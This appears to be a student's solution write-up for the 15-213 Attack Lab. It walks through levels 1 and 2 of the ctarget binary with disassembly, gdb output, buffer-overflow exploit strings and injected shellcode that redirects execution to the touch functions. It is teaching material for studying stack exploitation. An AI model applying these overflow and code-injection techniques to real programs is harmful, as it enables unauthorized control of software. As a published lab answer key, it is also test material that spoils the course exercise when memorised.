- [Lab 2: Attack Lab](#lab-2--attack-lab)
  * [**Problem Description**](#--problem-description--)
  * [Part 1. *ctarget*](#part-1--ctarget-)
  * [ctarget Level 1: goal](#ctarget-level-1--goal)
  * [ctarget Level 1: Solution](#ctarget-level-1--solution)
    + [Step 1. Disassemble the ctarget](#step-1-disassemble-the-ctarget)
    + [Step 2. Inspect the stack frame of *getbuf*](#step-2-inspect-the-stack-frame-of--getbuf-)
    + [Step 3. Attack the return address](#step-3-attack-the-return-address)
  * [ctarget Level 2: Goal](#ctarget-level-2--goal)
  * [ctarget Level 2: Solution](#ctarget-level-2--solution)
    + [Step 1. Inspect the stack](#step-1-inspect-the-stack)
    + [Step 2. Make a code](#step-2-make-a-code)
    + [Step 3. Verify](#step-3-verify)
# Lab 2: Attack Lab

> *Covered Concept: Stack Frame, Buffer Overflow, Return Oriented Programming*  

## **Problem Description**

> Two programs, *ctarget* and *rtarget*, are provided. Both program has vulnerabilities of buffer overflow. Make use of the vulnerabilities to achieve the specific goals. Each files has 3 level of challenge. Let's get started.  
> More details in the ***attacklab.pdf***


## Part 1. *ctarget*
---
## ctarget Level 1: goal

Function getbuf is called within CTARGET by a function test having the following C code:
```C
1 void test()
2 {
3     int val;
4     val = getbuf();
5     printf("No exploit. Getbuf returned 0x%x\n", val);
6 }
```
When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution
within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,
there is code for a function touch1 having the following C representation:
```C
1 void touch1()
2 {
3     vlevel = 1; /* Part of validation protocol */
4     printf("Touch1!: You called touch1()\n");
5     validate(1);
6     exit(0);
7 }
```
Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,
rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly
related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

---
## ctarget Level 1: Solution

Strategy
>We could make the buffer overflow to change the return address on the stack frame of ***getbuf*** so that the return address is pointed to ***touch1()***  

### Step 1. Disassemble the ctarget
```shell=
 objdump -d ctarget > ctarget.asm
```
Let's see the ***getbuf***
```
    00000000004017a8 <getbuf>:
      4017a8:	48 83 ec 28          	sub    $0x28,%rsp
      4017ac:	48 89 e7             	mov    %rsp,%rdi
      4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
      4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
      4017b9:	48 83 c4 28          	add    $0x28,%rsp
      4017bd:	c3                   	ret    
      4017be:	90                   	nop
      4017bf:	90                   	nop
```  
1. Allocate 0x28 bytes on the stack  
2. The result of \<Gets\> is put on the stack.

```
    00000000004017c0 <touch1>:
      4017c0:	48 83 ec 08          	sub    $0x8,%rsp
      4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
      4017cb:	00 00 00 
      4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
      4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
      4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
      4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
      4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
      4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```
1. The address of *\<touch1\>* is `0x4017c0` 

### Step 2. Inspect the stack frame of *getbuf*

```
     gdb ctarget  # debug the ctarget
     b getbuf     # set a breakpoint at getbuf
     run -q -i ansC.txt  # run the ctarget with ansC.txt as input
     info frame   # inspect the stack frame of getbuf
``` 

Result:  


>(gdb) info frame
Stack level 0, frame at 0x5561dca8:
 rip = 0x4017a8 in getbuf (buf.c:12); saved rip = 0x401976
 called by frame at 0x5561dcb8
 source language c.
 Arglist at 0x5561dc98, args: 
 Locals at 0x5561dc98, Previous frame's sp is 0x5561dca8
 Saved registers:
  rip at 0x5561dca0

   &rArr; saved rip = 0x401976  

Let's see the <test> in the **ctarget.asm** 
The saved rip points to the instruction right after calling     ***getbuf*** in the ***test***  
```=
    0000000000401968 <test>:
      401968:	48 83 ec 08          	sub    $0x8,%rsp
      40196c:	b8 00 00 00 00       	mov    $0x0,%eax
      401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>
      401976:	89 c2                	mov    %eax,%edx
      401978:	be 88 31 40 00       	mov    $0x403188,%esi
      40197d:	bf 01 00 00 00       	mov    $0x1,%edi
      401982:	b8 00 00 00 00       	mov    $0x0,%eax
      401987:	e8 64 f4 ff ff       	call   400df0 <__printf_chk@plt>
      40198c:	48 83 c4 08          	add    $0x8,%rsp
      401990:	c3                   	ret    
      401991:	90                   	nop
```  

rip at 0x5561dca0 &rArr; where the return address is stored 

### Step 3. Attack the return address

The getbuf has allcoate 0x28 bytes on the stack.
&rArr; We should make 0x28 (40) dummy bytes on the stack.  
&rArr; After 0x28 bytes, the buffer overflowed and input has reached the return address of ***getbuf***.  

Since the address of ***touch1*** is `0x4017c0`  
&rArr; The answer would be:  
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40
```  
Since the machine is little endian, reverse the byte order of address. 

```shell=
./hex2raw -i ansC_lv1.txt > ansC_lv1_raw.txt
./ctarget -q -i ansC_lv1_raw.txt
```

>Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 

---

## ctarget Level 2: Goal

Phase 2 involves injecting a small amount of code as part of your exploit string.
Within the file ctarget there is code for a function touch2 having the following C representation:
```C
1 void touch2(unsigned val)
6
2 {
3     vlevel = 2; /* Part of validation protocol */
4     if (val == cookie) {
5         printf("Touch2!: You called touch2(0x%.8x)\n", val);
6         validate(2);
7     } else {
8         printf("Misfire: You called touch2(0x%.8x)\n", val);
9         fail(2);
10    }
11    exit(0);
12 }
```

Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument. Some Advice:  
• You will want to position a byte representation of the address of your injected code in such a way that
ret instruction at the end of the code for getbuf will transfer control to it.
• Recall that the first argument to a function is passed in register %rdi.
• Your injected code should set the register to your cookie, and then use a ret instruction to transfer
control to the first instruction in touch2.
• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination
addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of
control, even when you are not returning from a call.
• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequences.  
    
---
## ctarget Level 2: Solution

### Step 1. Inspect the stack
Up to now, the stack is as shown:  
    ![](https://i.imgur.com/mHK12AP.png)
    
Our target is to pass cookie number as an argument and transfer control to **touch2**  

&rArr; We should make a code to achieve it.  
  
**Strategy**
    Make a code in the stack through exploit string to pass cookie number as argument and ret to **touch2**
  
### Step 2. Make a code

1. We should transfer the control to our code in the stack.
    &rArr; The return address should point to the entry of our code.

2. After transfer, the stack has popped the return address. Since we are roing to transfer the control to **touch2**, we should push the address of **touch2** on the stack so that the next `ret` will jump to **touch2**. 

3. Pass the cookie as argument and ret.  

As a result of 2, 3: 
    
```=
#exploit code for ctarget level 2	
pushq $0x4017ec  # push the addr of touch2
movq $0x59b997fa, %rdi   # pass cookie as argument
ret   # return to the pushed return address
```

To get the form in bytes,
```=
gcc -c ansC_lv2_code.s
objdump -d ansC_lv2_code.o > ansC_lv2_code.s
```
We get the disassembly 
```=
    ./ansC_lv2.o      檔案格式 elf64-x86-64


.text 區段的反組譯：

0000000000000000 <.text>:
   0:	68 ec 17 40 00       	push   $0x4017ec
   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   c:	c3                   	ret    
```

&rArr; Since the raw code contains 13 bytes, the entry of the code is 0x5561dca0 - 13 = `0x5561dc93`. We should make the return address this number.  

Consequently we make a input as below (in ansC_lv2.txt):
```=
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00
68 ec 17 40 00
48 c7 c7 fa 97 b9 59
c3
93 dc 61 55 00 00 00 00
```

### Step 3. Verify

```shell=
./hex2raw -i ansC_lv2.txt > ansC_lv2_raw.txt
./ctarget -q -i ansC_lv2_raw.txt
```  
Result:
```=
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 93 DC 61 55 00 00 00 00
```


